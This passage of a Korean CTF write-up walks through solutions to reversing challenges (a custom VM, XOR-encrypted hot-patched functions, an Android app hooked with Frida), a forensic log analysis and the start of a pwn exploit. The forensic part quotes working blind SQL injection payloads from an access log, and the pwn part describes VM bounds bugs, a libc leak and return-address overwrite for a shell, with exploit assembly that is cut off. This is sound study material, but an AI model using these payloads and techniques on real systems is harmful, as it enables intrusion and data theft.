   }
}
```

flag: bob{DO_NOT_USING_GOLANG_PLZ_JUST_KEEP_GOING}


<br/>


<br/>



## bvm-rev

---

![/assets/bob/bob952.png](/assets/bob/bob952.png)
```
bvm 바이너리에서 로드하는 flag.bvm의 코드 흐름 분석
```
![/assets/bob/bob953.png](/assets/bob/bob953.png)

bvm 파일은 위 그림과 같은 구조를 가지고, 각 섹션은 코드 영역, 데이터 영역, 변수 영역 등으로 사용된다.

```c
struct CALLSTACK {
    uint16_t reg[4];
    uint16_t retaddr;
};

struct BVM {
    uint16_t section[32];
    uint8_t 32;
    int8_t zf;
    struct CALLSTACK callstack[6];
    int8_t cs_count;
    uint32_t size;
    uint8_t data[2048];
    uint16_t reg[4]; //ax, bx, cx, dx
    uint16_t pc;
};
```

각 opcode가 어떤 동작을 하는지 파악하기 위해서는 구조체를 정의하고 분석하는 것이 편하다.

그리고 분석을 통해 아래의 몇가지 사실을 알 수 있다.

1. 4개의 register(ax, bx, cx, dx)를 사용하고 각 레지스터와 모든 연산처리는 2bytes 크기를 가진다.
2. CALL instruction을 호출할 때 register와 돌아올 주소를 백업하고, RETURN을 만나면 ax register를 제외한 register를 복원하고 돌아올 주소로 pc를 변경한다.
3. 경계(boundary)를 넘어서는 참조가 발견되면 프로그램이 종료된다. (일부 opcode에서는 경계 검사를 하지 않는다)

```
.KEY
db 170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33

.ENC_FLAG
db 123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113

.GET_FLAG_LENGTH
MOVE ax, SECTION#INPUT_FLAG
MOVE cx, 0
:LABEL_1
MOVE bx, ax
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP bx, 0
JE LABEL_2
COMP bx, 10 // '\n'
JE LABEL_2
ADD cx, 1
JMP LABEL_1
:LABEL_2
MOVE ax, cx
RETURN

.ROL
MOVE cx, bx
MOD cx, 8
MOVE bx, 8
SUB bx, cx
RSHIFT cx, ax, bx

MOVE dx, 8
SUB dx, bx
MOVE bx, dx

LSHIFT dx, ax, bx
MOVE bx, 8
LSHIFT ax, cx, bx
SUB dx, ax
MOVE ax, dx
ADD ax, cx
RETURN

.FLAG_CHECK
MOVE cx, 0

:LABEL_3
MOVE ax, SECTION#INPUT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, cx
CALL ROL
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

MOVE ax, SECTION#KEY
MOVE bx, cx
MOD bx, 16
ADD ax, bx
MOVE dx, [ax]
AND dx, 255

MOVE ax, SECTION#INPUT_FLAG
MOVE bx, cx
ADD bx, 1
MOD bx, 33
ADD ax, bx
MOVE ax, [ax]
AND ax, 255

ADD dx, ax
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE ax, [bx]
XOR ax, dx
AND ax, 255

MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

ADD cx, 1
COMP cx, 33
JNE LABEL_3

MOVE cx, 0
MOVE dx, 1

:LABEL_4
MOVE ax, SECTION#RESULT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, SECTION#ENC_FLAG
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP ax, bx
JE LABEL_5
MOVE dx, 0
:LABEL_5

ADD cx, 1
COMP cx, 33
JNE LABEL_4
MOVE ax, dx
RETURN

.STRING_CHECK_YOUR_FLAG
string "Check your flag: "

.STRING_CORRECT
string "Correct !!\n"

.STRING_INCORRECT
string "Wrong ...\n"

.INPUT_FLAG
empty 50

.RESULT_FLAG
empty 34

.MAIN
MOVE cx, 17
MOVE bx, SECTION#STRING_CHECK_YOUR_FLAG
MOVE ax, 1
SYSCALL

MOVE cx, 48
MOVE bx, SECTION#INPUT_FLAG
MOVE ax, 0
SYSCALL

CALL GET_FLAG_LENGTH
COMP ax, 33
JNE LABEL_6

CALL FLAG_CHECK
COMP ax, 1

JNE LABEL_6
MOVE cx, 11
MOVE bx, SECTION#STRING_CORRECT
MOVE ax, 1
SYSCALL
RETURN

:LABEL_6
MOVE cx, 10
MOVE bx, SECTION#STRING_INCORRECT
MOVE ax, 1
SYSCALL
RETURN
```

bvm 바이너리 분석을 통해 각 bvm opcode를 해석하고 flag.bvm을 위와 같이 disassemble한다.

```python
def ROL(data, shift):
    shift %= 8
    remains = data >> (8 - shift)
    body = (data << shift) - (remains << 8)
    return (body + remains)

def GET_FLAG_LENGTH(inp):
    return len(inp)

ENC_FLAG = [123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113]
KEY = [170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33]

INPUT_FLAG = list(input("Check your flag: ").encode())
if GET_FLAG_LENGTH(INPUT_FLAG) != 33:
    exit(0)

RESULT_FLAG = [0] * 33

for i in range(33):
    RESULT_FLAG[i] = ROL(INPUT_FLAG[i], i)
    RESULT_FLAG[i] ^= KEY[i % 16] + INPUT_FLAG[(i + 1) % 33]
    RESULT_FLAG[i] &= 0xFF

if RESULT_FLAG == ENC_FLAG:
    print("Correct !!")
else:
    print("Wrong ..")
```

disassmble한 결과를 python으로 포팅한다.

```python
def ROR(data, shift):
    shift %= 8
    body = data >> shift
    remains = (data << (8 - shift)) - (body << 8)
    return (body + remains)

KEY = [170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33]
ENC_FLAG = [123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113]

FLAG = [0] * 33
FLAG[0] = ord('b') # prefix "bob{"

for i in range(32, -1, -1):
    FLAG[i] = ROR(ENC_FLAG[i] ^ (FLAG[(i + 1) % 33] + KEY[i % 16]) & 0xFF, i)

print("FLAG => {}".format(bytes(FLAG)))
# FLAG => b'bob{BVM_Wi1l_C0m2_B@ck_N2xt_T1me}'
```

이것을 역연산하는 코드를 작성하면 flag를 획득할 수 있다.

해당 방식 이외에 비교 opcode(0x9, 0x19)에 BP를 걸고 input에 따라 변화하는 register를 보고 규칙을 찾아 flag를 간접적으로 추출하는 방법도 가능하다.


<br/>


<br/>



## Hot Patching

---

![/assets/bob/hot_patching_1.png](/assets/bob/hot_patching_1.png)
```
Hot Patching 바이트를 통한 Key 추출
```
![/assets/bob/01_main.png](/assets/bob/01_main.png)
<center>[그림 1] main 함수(0x42D7A0) Hex-Rays 결과</center>

- main 함수(0x42D7A0)에서 sub_401000을 호출한다.

![/assets/bob/02_401000.png](/assets/bob/02_401000.png)
<center>[그림 2] sub_401000 함수 Hex-Rays 결과</center>

- sub_401000은 위와 같다.

![/assets/bob/03_42D710.png](/assets/bob/03_42D710.png)
<center>[그림 3] Xor을 수행하는 sub_42D710 함수</center>

- sub_42D710는 sub_401000에서 두 번 호출된다.
VirtualProtect를 통해 특정 영역의 메모리를 PAGE_EXECUTE_READWRITE(0x40)으로 변경시킨다.
그 후 세번 째 인자 값을 참조하여 Xor 연산 한다.

![/assets/bob/04_sub_401000.png](/assets/bob/04_sub_401000.png)
<center>[그림 4] sub_401000 함수 동작 파악 후 네이밍 결과</center>

- sub_401000 함수 내 변수 및 함수 이름을 보기 쉽게 네이밍하였다.
- 해당 함수의 실행 흐름은 다음과 같다.
    1. scanf_s 함수를 통해 입력을 받는다.
    2. **입력 값**의 글자 수를 확인하고, **5글자**가 아닐 시 1을 반환한다.
    3. **0x4010D0** 주소에서 0x2C630(0x42D700 - 0x4010D0) 크기 만큼 **입력 값**과 **Xor** 연산 한다.
    4. **0x44A8C0** 주소에서 0x20 크기 만큼 **입력 값**과 **Xor** 연산 한다.
    5. Xor 연산 후의 **0x4010D0** 함수를 호출한다.

![/assets/bob/05_4010D0.png](/assets/bob/05_4010D0.png)
<center>[그림 5] Xor 연산 전 sub_4010D0 함수</center>

- Xor 연산 전 0x4010D0 함수는 위와 같이 생겼다. 실행 가능한 어셈블리 코드로는 보이지 않는다.

***"그렇다면, 입력 값이 5글자인 것 외에 단서는 무엇이 있을까?"***

- 0x4010D0은 다른 함수와 공통된 [**함수 프롤로그**](https://en.wikipedia.org/wiki/Function_prologue)를 가지고 있을 것이다.
x86 실행 바이너리는 함수 시작 시 아래와 같은 함수 프롤로그를 가지고 있다.

```c
55        push ebp
8B EC     mov ebp, esp
83 EC XX  sub esp, N
```

![/assets/bob/06_prol.png](/assets/bob/06_prol.png)
<center>[그림 6] 함수 초기 프롤로그</center>

- 문제 바이너리에서는 함수 프롤로그 이전에 2바이트 어셈블리 `xchgax,ax` 가 보인다.
해당 어셈블리는 2바이트 NOP 코드 `0x66 0x90` 이다.
Visual Studio 컴파일 시 [**HotPatch 옵션**](https://docs.microsoft.com/ko-kr/cpp/build/reference/hotpatch-create-hotpatchable-image?view=vs-2019)이 활성화 된 경우 생기는 코드이다.

**[Hot Patching](https://en.wikipedia.org/wiki/Patch_(computing)#Hot_patching)[1]**이란, 서비스의 종료나 재시작 없이 패치를 적용하는 업데이트 방법이다.
x86 어셈블리 언어에서는 패치를 위해 LONG JMP 명령을 사용한다.
해당 명령은 5바이트가 필요하므로, **3바이트**인 **함수 프롤로그** 외 **2바이트**의 **NOP 코드**를
추가하여 [**Hot Patching](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc782258(v=ws.10)?redirectedfrom=MSDN)[2]**에 사용한다.

***Windows x86 라이브러리 모듈에서는 주로*** `movedi,edi` ***를 사용한다.***

- Hot Patching에 사용할 5바이트 `0x66 0x90 0x55 0x8B 0xEC` 를 통해, 입력 값을 구할 수 있다.
**apple** `0x61 0x70 0x70 0x6C 0x65=0x07 0xE0 0x25 0xE7 0x89**Xor**0x66 0x90 0x55 0x8B 0xEC`

![/assets/bob/07_apple.png](/assets/bob/07_apple.png)
<center>[그림 7] apple 입력 후 화면</center>

- apple을 입력하니 또 다시 입력을 받는다.

![/assets/bob/08_code.png](/assets/bob/08_code.png)
<center>[그림 8] Xor 연산 후 0x4010D0 디스어셈블 결과</center>

- Xor 연산을 수행한 0x4010D0 부분의 코드가 정상적으로 보인다.

![/assets/bob/09_code2.png](/assets/bob/09_code2.png)
<center>[그림 9] 0x4010D0 함수의 입력 값 사용</center>

- 다음 입력 값의 크기는 5이며, 0x4011A0 주소와 Xor 연산하는 것으로 보인다.
연산할 크기는 0x2C560(0x42D700 - 0x4011A0)이다.
- **apple**과 같은 방법으로 입력 값 **mango**를 구할 수 있다.
****apple을 입력 후 바뀐 0x4010A0 ~ 0x4010A4 범위의 값을 사용해야한다.***
- 같은 방법으로 다음 입력 값 **lemon**을 구할 수 있다.

![/assets/bob/10_code3.png](/assets/bob/10_code3.png)
<center>[그림 10] 0x401270 함수에서 6글자 입력 값 요구</center>

- 세 번째 입력 값 lemon 이후에는 입력 값이 6으로 증가한다.
- 그래도 알려진 5바이트를 통해 **orang** 5글자를 구할 수 있다.
이전에 과일이 나왔으므로 **orange**로 유추해 볼 수 있다.
또한  `subesp,N`  코드의 `0x83 0xEC 0x??` 를 통해서 총 최대 7글자를 구할 수 있다.

![/assets/bob/11_flag.png](/assets/bob/11_flag.png)
<center>[그림 11] Flag 출력</center>

- 알려진 7바이트와 유추를 통해서 Key를 총 10번 입력하면 Flag를 획득할 수 있다.

```python
key_info = [
    {"addr":0x4010D0, "size":5, "data":[0x07, 0xE0, 0x25, 0xE7, 0x89]},
    {"addr":0x4011A0, "size":5, "data":[0x0B, 0xF1, 0x3B, 0xEC, 0x83]},
    {"addr":0x401270, "size":5, "data":[0x0A, 0xF5, 0x38, 0xE4, 0x82]},
    {"addr":0x401350, "size":6, "data":[0x09, 0xE2, 0x34, 0xE5, 0x8B, 0xE6]},
    {"addr":0x401430, "size":6, "data":[0x04, 0xF1, 0x3B, 0xEA, 0x82, 0xE2]},
    {"addr":0x401510, "size":6, "data":[0x02, 0xE5, 0x27, 0xE2, 0x8D, 0xED]},
    {"addr":0x4015F0, "size":7, "data":[0x05, 0xE5, 0x27, 0xF9, 0x8D, 0xED, 0x98]},
    {"addr":0x4016D0, "size":7, "data":[0x07, 0xE6, 0x3A, 0xE8, 0x8D, 0xE7, 0x83]},
    {"addr":0x4017B0, "size":7, "data":[0x05, 0xFF, 0x36, 0xE4, 0x82, 0xF6, 0x98]},
    {"addr":0x401890, "size":8, "data":[0x0B, 0xF1, 0x3B, 0xEF, 0x8D, 0xF1, 0x85, 0x4E]}
]

known_bytes = [0x66, 0x90, 0x55, 0x8B, 0xEC, 0x83, 0xEC]
for k in key_info:
    data = k["data"]
    key = ""
    size = len(data)
    for i in range(size):
        key += chr(data[i] ^ known_bytes[i % 7])

    print(key[:5] + "?" * (size - 5), "=>", key) #Known Bytes Size == 5, 7

""" #Result
apple => apple
mango => mango
lemon => lemon
orang? => orange
banan? => banana
duria? => durian
curra?? => currant
avoca?? => avocado
cocon?? => coconut
manda??? => mandari? => mandarin*
"""
```


<br />


<br />


## Hot Patching 777

---

![/assets/bob/hot_patching_2.png](/assets/bob/hot_patching_2.png)

공통된 명령 바이트를 통한 Key 추출 자동화 

- 이전 **Hot Patching** 문제는 별도의 자동화 없이 문제를 해결할 수 있었다.

![/assets/bob/12_flag_xor.png](/assets/bob/12_flag_xor.png)
<center>[그림 1] 0x401890 함수에서 Flag 출력 후 연산 데이터</center>

- 0x401890 함수에서 첫 번째 Flag를 출력해주고, 다음 Flag를 위한 연산이 수행된다.

![/assets/bob/13_11th_function.png](/assets/bob/13_11th_function.png)
<center>[그림 2] 0x401890 함수에서 별도 입력 처리 없이 다음 함수 복호화 수행</center>

- 10 번째 Key까지 모두 올바르게 입력된 경우, 다음 함수는 별도 입력 처리 없이 복호화 된다.

![/assets/bob/14_length.png](/assets/bob/14_length.png)
<center>[그림 3] 0x4019B0 함수에서 입력 값 검사</center>

- 첫 번째 Flag 출력 이전까지는 5~8 글자의 입력 값이 필요했지만, 11 번째는 17 글자를 요구한다.
- 알려진 7바이트를 통해, 일부를 복구하여도 이전과 다르게 특정 단어로 추정할 수 없다.
**TO5yQyc** `0x54 0x4F 0x35 0x79 0x51 0x79 0x63`
            `=0x32 0xDF 0x60 0xF2 0xBD 0xFA 0x8F**Xor**0x66 0x90 0x55 0x8B 0xEC 0x83 0xEC`
                                 ***"그렇다면, 알려진 7바이트 외에 단서가 필요하다."***

- 지금까지 Flag 출력 함수 외 모든 함수는 같은 형식으로 구성되어있다.
다른 점은 입력 값의 크기, 복호화 대상 주소, 다음 함수 주소 등이다.

![/assets/bob/15_dummy.png](/assets/bob/15_dummy.png)
<center>[그림 4] 함수 중간 중간 존재하는 더미코드</center>

- 함수의 내용은 모두 같지만, 중간 중간 더미코드가 혼란을 주고 있다.
더미코드의 영향을 받지 않으면서 공통된 어셈블리 코드를 찾아야한다.

![/assets/bob/16_common.png](/assets/bob/16_common.png)
<center>[그림 5] 공통된 strlen 기능 코드</center>

- strlen 기능의 코드 덕분에 무려 58바이트의 공통 코드를 찾을 수 있다.
****마지막 cmp 명령의 글자수(0x07) 비교 전 까지 58 바이트***

![/assets/bob/17_scan.png](/assets/bob/17_scan.png)
<center>[그림 6] 공통 코드 메모리 검색 결과</center>

- 현재 Flag 출력 외 11개 함수가 복호화되어있다. 공통 코드를 검색한 결과 또한 11개다.
이를 활용하여 입력 값 추출 자동화를 수행할 수 있다.
- 아래와 같은 내용을 토대로 자동화 코드를 작성하였다.
    1. 디스어셈블러를 통해, cmp 명령어에서 비교할 입력 값을 구한다.
    2. 이후 sub 명령어에서 Xor 연산 시작 주소를 구한다.
    3. 알려진 5바이트를 통해, 입력 값의 첫 5글자를 획득한다.
    4. 첫 5글자를 패치 대상 데이터와 Xor 연산하고, 공통 코드 58바이트에 포함되는지 확인한다.
    5. 포함될 경우 입력 값을 추출할 수 있다.
    6. 디스어셈블러, 코드 패치 기능을 수행할 수 있는 IDA Python을 사용하여 작성한다.

```python
import struct
p32 = lambda x:struct.pack("<L", x)

# patch_xor : Xor 연산을 통해 패치를 수행하는 함수
def patch_xor(addr_patch, addr_end, xor_key):
    size_patch = addr_end - addr_patch
    for i in range(size_patch):
        cur = addr_patch + i
        idc.PatchByte(cur, idc.Byte(cur) ^ xor_key[i % len(xor_key)])
        # Xor 연산한 데이터를 패치하여 반영
        idc.MakeUnknown(cur, 1, idc.DOUNK_SIMPLE)
        # 패치 후 Unknown 형태로 변환하여 잘못된 디스어셈블리 방지
    return

# xor_data : 단순 Xor 함수
def xor_data(addr_xor, addr_end, xor_key):
    result = []
    size_xor = addr_end - addr_xor
    for i in range(size_xor):
        cur = addr_xor + i
        result.append(idc.Byte(cur) ^ xor_key[i % len(xor_key)])
    return result

addr_start = 0x401000   # 함수 시작 주소
addr_end = 0x42D700     # 함수 마지막 주소, 길이 계산에 사용

cnt = 0
keys = []

cur = addr_start
while cur < addr_end:   # 디스어셈블리를 통해 Key 크기, 패치 주소를 구함
    key_size = 0
    addr_patch = 0
    while cur < addr_end:
        try:
            dis = idc.GetDisasm(cur)
            if dis.find("retn") != -1:
                break
            # cmp 명령어에서 Key 크기 추출
            if dis.find("cmp") != -1 and dis.find("], 0") == -1:
                tmp = dis.split(", ")[1]
                if tmp.find("h") != -1:
                    key_size = int(tmp[:-1], base=16)
                else:
                    key_size = int(tmp)
            # sub 명령어에서 패치 주소 추출
            if dis.find("sub") != -1 and dis.find("offset") != -1:
                tmp = dis.split("_")[1].replace(" ", "")
                if tmp.find(";") != -1:
                    tmp = tmp.split(";")[0]
                addr_patch = int(tmp, base=16)
            cur += idc.ItemSize(cur)
        except:
            break
            
    print cnt, key_size, hex(addr_patch),
    
    # Flag 출력 함수의 경우 임의로 Key을 수정
    if cnt == 10:
        key_size = 32
        
        tmp = p32(0x454D4E4A)
        tmp += p32(0x07692B4B)
        tmp += p32(0x2D0C1A2C)
        tmp += p32(0x0E0D100A)
        tmp += p32(0x09090476)
        tmp += p32(0x26065966)
        tmp += p32(0x1C103417)
        tmp += p32(0x567C2075)
        
        prev_key = xor_key[::]
        xor_key = []
        for i in range(key_size):
            xor_key.append(ord(tmp[i]) ^ prev_key[i % len(prev_key)])
    
    # 연산 오류가 있을 시 break
    if key_size == 0 or addr_patch == 0:
        break
    
    # Flag 출력 함수가 아닌 경우, Key 추출 수행
    if key_size != 32:
        known_data = [0x66, 0x90, 0x55, 0x8B, 0xEC] # 알려진 Hot Patching 5바이트
        xor_key = []
        # Hot Patching 5바이트를 통해, Key 첫 5글자 추출
        for i in range(5):
            xor_key.append(idc.Byte(addr_patch + i) ^ known_data[i])
        
        # 5글자 보다 많을 경우
        if key_size != 5:
            xor_key += [0x00] * (key_size - 5)

            # 모르는 글자는 0x00으로 채우고 Xor 연산 수행
            data = xor_data(addr_patch, addr_end, xor_key)
            
            # 공통 58바이트 코드
            known_data = [0xC7, 0x45, 0xF8, 0x04, 0xB3, 0x44, 0x00, 0x8B, 0x45, 0xF8, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xF4, 0x8B, 0x4D, 0xF8, 0x8A, 0x11, 0x88, 0x55, 0xFF, 0x83, 0x45, 0xF8, 0x01, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xEE, 0x8B, 0x45, 0xF8, 0x2B, 0x45, 0xF4, 0x89, 0x45, 0xF0, 0x8B, 0x4D, 0xF0, 0x89, 0x0D, 0x00, 0xB3, 0x44, 0x00]
            known_data = "".join(chr(x) for x in known_data)
            
            # 공통 58바이트 코드를 통한, Key 전부를 복구
            xor_key = xor_key[:5]
            for i in range(len(data) - key_size):
                # 공통 코드와 Xor 수행한 결과를 5바이트씩 비교
                cur_data = "".join(chr(x) for x in data[i:i+5])
                idx = known_data.find(cur_data)
                if idx != -1:   #
                    # 공통 코드의 어느 인덱스부터 Key이 시작 되는지 확인
                    # (Key 크기, 더미 코드 등에 의해 오프셋이 매번 다르기 때문)
                    org = known_data[idx+5:idx+5+key_size]
                    for j in range(key_size - 5):
                        xor_key.append(ord(org[j]) ^ data[i+5+j]) #Key 복구
                    break
            
            if len(xor_key) == 5:
                # Flag 출력 함수(11 번째)의 경우 예외로 처리
                if cnt == 9:
                    xor_key += [ord('r'), ord('i'), ord('n')] #mandarin
                else:
                    print "Error!!"
                    xor_key += [0x00] * (key_size - 5)
        
    print "".join(chr(x) for x in xor_key)
    keys.append("".join(chr(x) for x in xor_key))
    
    
    patch_xor(addr_patch, addr_end, xor_key)    # 추출한 Key를 통해 패치 수행
    idc.MakeCode(addr_patch)                    # 어셈블리 코드로 변환
    idc.MakeFunction(addr_patch)                # 함수화 수행
    
    cur = addr_patch
    cnt += 1

f = open("solve_key.txt", "wb")                 # 추출한 Key를 저장
for i in range(len(keys)):
    f.write(keys[i])
    f.write("\r\n")
f.close()
```

![/assets/bob/18_flag2.png](/assets/bob/18_flag2.png)

<center>[그림 7] 두 번째 Flag 획득</center>

- Flag 또한 자동으로 연산할 수 있지만, 자동화로 추출한 입력 값을 복사 후 대입하여 획득하였다.


<br />


<br />



## EASYROID

---

![/assets/bob/bob954.png](/assets/bob/bob954.png)
```
Easy Android Reversing Challenge
```
- JAVA 코드를 먼저 살펴보자.

    ![/assets/bob/bob955.png](/assets/bob/bob955.png)

    `MainActivity`가 실행되면 [`libnative-lib.so`](http://native-lib.so)에 정의되어 있는 `stringFromJNI` 함수를 호출 한뒤 `setText`로 `TextView`에 넣어주는 간단한 코드이다.

- `stringFromJNI` 함수를 살펴보자.

    ![/assets/bob/bob956.png](/assets/bob/bob956.png)

    `stringFromJNI` 함수는 `Hello BOB9?` 문자열을 리턴해준다.

결국 앱을 실행하면 화면에 `Hello BOB9?` 문자열이 출력된요. 실행해서 확인하자.

![/assets/bob/bob957.png](/assets/bob/bob957.png)

빙고!

 [`libnative-lib.so`](http://native-lib.so)의 Export Table을 살펴보면 `stringFromJNI` 함수 이 외 한 가지 함수가 더 존재한다.

![/assets/bob/bob958.png](/assets/bob/bob958.png)

HiddenStage!!!

HiddenStage 함수를 살펴보자.

![/assets/bob/bob959.png](/assets/bob/bob959.png)

BLOWFISH 를 사용해서 특정 값을 Decrypt 하고 Flag를 출력해보자.

따라서 `F0`를 BLOWFISH의 키로 `BOB9`을 사용해서 Decrypt 해주면 Flag가 나오겠지?

하지만 여기서 `Fake`가 존재한다. Init의 마지막 인자는 Key Size인데 7이다.

따서 실제 BLOWFISH의 키 값은 `BOB9\x00\x00\x00`!

이런 Fake에 당하지 않으려면 실제로 그대로 실행하는 방법이 있다.

새로운 프로젝트를 만들어서 .so를 끼워넣고 컴파일하는 방법도 있겠지만 Frida를 사용해보자.

```jsx
var addrStringFromJNI = Module.findExportByName(null, 'Java_jeong_su_bob9_1easy_1android_MainActivity_stringFromJNI');
var addrHiddenStage = Module.findExportByName(null, 'Java_jeong_su_bob9_1easy_1android_MainActivity_HiddenStage');
var HiddenStage = new NativeFunction(addrHiddenStage, 'int', ['pointer']);

Interceptor.attach(addrStringFromJNI, {
	onEnter: function(argv){
		this.arg0 = argv[0];
	},
	onLeave: function(rets){
		rets.replace( HiddenStage(this.arg0) );
	}
});
```

이 스크립트는 stringFromJNI 함수가 호출되면 HiddenStage 함수를 호출하여 리턴을 변경해주는 스크립트이다.

```jsx
am start -n jeong.su.bob9_easy_android/.MainActivity
```

그리고 MainActivity를 am 명령어를 사용하여 시작해주면 아래와 같이 플래그를 확인할 수 있다.

![/assets/bob/bob960.png](/assets/bob/bob960.png)


<br />


<br />



# 🖥️ FORENSIC

## SQL Eyes

---

![/assets/bob/bob961.png](/assets/bob/bob961.png)

Find the leaked data

- 해당 문제에서는 웹 서버의 access.log 파일이 제공되었다.

```
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=1 HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=2-1 HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7C1-- HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C1%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 500 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /archives/ HTTP/1.1" 404 437 "-" "DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C2%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C3%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
```

- access.log를 통해 데이터를 유출한 공격은 Blind SQL Injection 공격인 것을 알 수 있는데 유형이 2가지가 있다.
- `0||if(substr(lpad(bin(ord(substr(flag,1,1))),8,0),1,1)=1,1,(select 1 union select 2))`을 통해 거짓일 경우에는 500 에러를 발생시켜 Error based SQL Injection 공격을 한 것을 확인할 수 있다.
- 두번째 유형은 `0||if(substr(lpad(bin(ord(substr(flag,12,1))),8,0),1,1)=1,sleep(3)=0,1)=0--` 을 통해 참일 경우 3초 sleep하여 Time based SQL Injection 공격을 한 것을 확인할 수 있다.
- 위 두가지 공격 기법을 통해 공격자가 유출한 데이터를 파악하면 된다. 아래와 같이 스크립트를 작성하여 문제를 해결할 수 있다.

```python
f = open('access.log', 'r')
temp = ""
flag = ""
prevsec = 0
first_bypass = True

for line in f.readlines():
    x = line.split()
    
    if len(x) == 0:
        continue
        
    if "OWASP_DirBuster_Project" in x[-1]:
        continue
        
    if 'union' in x[6]:
        if x[8] == '200':
            temp += "1"
        else:
            temp += "0"
        
        if len(temp) % 8 == 0 and len(temp) != 0:
            flag += chr(int(temp, 2))
            print(flag)
            temp = ""
    
    if 'sleep' in x[6]:
        if first_bypass:
            first_bypass = False
            continue
        hour, min, sec = x[3].split(":")[1:]
        allsec = int(min) * 60 + int(sec)
        relsec = allsec - 3111
            
        if (relsec - prevsec) > 2.5:
            temp += "1"
        else:
            temp += "0"
        
        if len(temp) % 8 == 0 and len(temp) != 0:
            flag += chr(int(temp, 2))
            print(flag)
            temp = ""
        
        prevsec = relsec
```


<br />


<br />




# 🖥️ PWN

## bvm-pwn

---

![/assets/bob/bob962.png](/assets/bob/bob962.png)

bvm에서 일부 경계 검사를 수행하지 않는 루틴을 이용하여 stack 영역 변조 및 쉘 획득

bvm opcode를 해석하고 실행하는 과정에서 총 3가지 취약점이 존재한다.

1. `COMP reg, reg` opcode에서 left register index에 대해서는 경계 검사를 하지만 right register index는 경계 검사를 하지 않아, 경계를 넘는 register index를 참조하여 255번 반복 비교를 통해 일부 stack 영역을 간접적으로 leak 할 수 있다.

![/assets/bob/bob963.png](/assets/bob/bob963.png)

2. `LSHIRT/RSHIFT reg, reg, reg`  opcode에서 left register index에 대한 경계 검사를 하지 않아 일부 stack 영역을 덮을 수 있다.

![/assets/bob/bob964.png](/assets/bob/bob964.png)

3. `MOVE reg, [reg]`  opcode에서 register index에 대한 경계 검사는 하지만 `vm->reg[right_idx]`가 `vm->size`보다 큰지에 대한 검사를 하지않아 일부 stack 영역을 leak 할 수 있다.
3번의 경우 사실 의도하지 않은 취약점으로, 대회 도중 패킷 모니터링을 했을 때 플래그를 획득한 4분 모두 1번 대신 이 취약점을 이용하였다.

![/assets/bob/bob965.png](/assets/bob/bob965.png)

위 취약점으로 main return address를 leak하여 libc 주소를 얻고 oneshot gadget를 계산하여 다시 main return address를 덮으면 쉘을 획득할 수 있다.

마지막으로 취약점을 트리거하는 vm code를 작성해야한다.

**pwn.asm**

```
.LEAK_DATA
empty 8

.LEAK_WORD_1
MOVE cx, 0
:LABEL_1
COMP cx, 18x
MOVE ax, cx
ADD cx, 1
JNE LABEL_1
RETURN

.LEAK_WORD_2
MOVE cx, 0
:LABEL_2
COMP cx, 19x
MOVE ax, cx
ADD cx, 1
JNE LABEL_2
RETURN

.LEAK_WORD_3
MOVE cx, 0
:LABEL_3
